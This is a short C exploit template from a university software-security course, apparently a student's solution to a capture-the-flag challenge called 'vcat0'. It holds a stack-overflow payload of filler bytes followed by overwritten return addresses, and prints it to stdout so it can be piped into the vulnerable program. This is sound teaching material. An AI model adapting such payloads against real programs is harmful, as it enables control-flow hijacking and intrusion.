/*
 * CTF-1 `vcat0' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>


/* FIXME */
// unsigned char payload[] =
// 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXX\x4f\x92\x98\x0a";
// unsigned char payload[] =
// 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXX\xbf\x91\x98\x0aXXXX\xef\xbe\xad\xde";	
unsigned char payload[] =
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXX\x16\x91\x98\x0aXXXX\x70\x94\x98\x0a";

int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
